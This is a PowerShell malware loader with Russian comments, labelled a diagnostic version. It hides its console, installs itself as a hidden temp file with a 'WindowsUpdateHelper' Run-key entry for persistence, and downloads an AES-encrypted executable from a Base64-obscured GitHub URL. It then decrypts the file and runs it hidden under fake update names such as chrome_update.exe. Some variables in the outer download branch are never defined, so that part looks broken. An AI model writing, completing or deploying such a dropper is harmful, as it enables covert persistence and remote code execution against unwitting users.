# === ДИАГНОСТИЧЕСКАЯ ВЕРСИЯ С ФИКСОМ ПУТИ ===
$logFile = "$env:TEMP\fx_debug_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
function Write-Log ($msg) { "$(Get-Date -Format 'HH:mm:ss'): $msg" | Out-File $logFile -Append }

Write-Log "=== СКРИПТ ЗАПУЩЕН ==="
Write-Log "Запущен через: $($MyInvocation.Line)"
Write-Log "Command.Path: $($MyInvocation.MyCommand.Path)"

# Пытаемся найти путь к самому себе (исправление для iex)
$scriptPath = $MyInvocation.MyCommand.Path
if ([string]::IsNullOrEmpty($scriptPath) -or $scriptPath -like "*<*>*") {
    # Если запущено через iex, сохраняем временный файл вручную
    $scriptPath = "$env:TEMP\fx_self_$(Get-Random).ps1"
    $myCode = @'
# === ENCRYPTED URL (BASE64) ===
$encodedUrl = "aHR0cHM6Ly9naXRodWIuY29tL2V2aWxncm91LXRlY2gvZ3JvdmkvcmF3L3JlZnMvaGVhZHMvbWFpbi9zZXR0aW5ncy5kYXQ="
$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedUrl))

# === KEY & IV (from Go script) ===
$key = [byte[]]@(87,105,110,85,112,100,97,116,101,50,48,50,53,83,117,112,101,114,75,101,121,49,50,51,52,53,54,55,56,57,48,31)
$iv = [byte[]]@(87,105,110,85,112,100,97,116,101,73,86,50,48,50,53,33)
$runName = "WindowsUpdateHelper"

Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'
[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0) | Out-Null

$isTemp = $MyInvocation.MyCommand.Path -like "$env:TEMP\*.ps1"
if (-not $isTemp) {
    $tempScript = "$env:TEMP\upd_" + [guid]::NewGuid().ToString().Substring(0,8) + ".ps1"
    Copy-Item $MyInvocation.MyCommand.Path $tempScript -Force
    attrib +h $tempScript
    Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $runName -Value "powershell -NoP -W Hidden -Exec Bypass -File `"$tempScript`"" -Force
    Write-Host "✅ Installed. Will run after reboot." -ForegroundColor Green
    exit
}
$wc = New-Object System.Net.WebClient
$data = $wc.DownloadData($url)
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = $iv
$plain = $aes.CreateDecryptor().TransformFinalBlock($data, 0, $data.Length)
if ($plain[0] -eq 0x4D -and $plain[1] -eq 0x5A) {
    $names = @("chrome_update.exe","edge_update.exe","windows_update.exe","system_update.exe")
    $out = "$env:TEMP\$($names | Get-Random)"
    [IO.File]::WriteAllBytes($out, $plain)
    Start-Process $out -WindowStyle Hidden
    Start-Sleep -Seconds 10
    Remove-Item $out -Force
}
'@
    $myCode | Out-File -FilePath $scriptPath -Encoding ascii
    Write-Log "Создан временный файл: $scriptPath"
}

Write-Log "Путь к скрипту: $scriptPath"
$isTemp = $scriptPath -like "$env:TEMP\*.ps1"
Write-Log "isTemp: $isTemp"

if (-not $isTemp) {
    Write-Log "=== РЕЖИМ 1: УСТАНОВКА ==="
    $tempScript = "$env:TEMP\upd_" + [guid]::NewGuid().ToString().Substring(0,8) + ".ps1"
    Write-Log "Копирую в: $tempScript"
    try {
        Copy-Item $scriptPath $tempScript -Force -ErrorAction Stop
        Write-Log "Копирование УСПЕШНО"
        
        attrib +h $tempScript
        Write-Log "Файл скрыт"
        
        $runName = "WindowsUpdateHelper"
        $cmd = "powershell -NoP -W Hidden -Exec Bypass -File `"$tempScript`""
        Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $runName -Value $cmd -Force
        Write-Log "Запись в Run: $cmd"
        
        Write-Log "✅ Установка завершена"
    } catch {
        Write-Log "❌ ОШИБКА: $_"
    }
} else {
    Write-Log "=== РЕЖИМ 2: ЗАГРУЗКА ==="
    try {
        Write-Log "Скачиваю $url"
        $wc = New-Object System.Net.WebClient
        $data = $wc.DownloadData($url)
        Write-Log "Скачано байт: $($data.Length)"
        
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $key
        $aes.IV = $iv
        $plain = $aes.CreateDecryptor().TransformFinalBlock($data, 0, $data.Length)
        Write-Log "Расшифровано байт: $($plain.Length)"
        
        if ($plain[0] -eq 0x4D -and $plain[1] -eq 0x5A) {
            $out = "$env:TEMP\$($names | Get-Random)"
            Write-Log "Сохраняю в: $out"
            [IO.File]::WriteAllBytes($out, $plain)
            Write-Log "Запускаю..."
            Start-Process $out -WindowStyle Hidden
            Write-Log "✅ Запущено"
        } else {
            Write-Log "❌ Не EXE файл"
        }
    } catch {
        Write-Log "❌ ОШИБКА: $_"
    }
}
Write-Log "=== СКРИПТ ЗАВЕРШЕН ==="
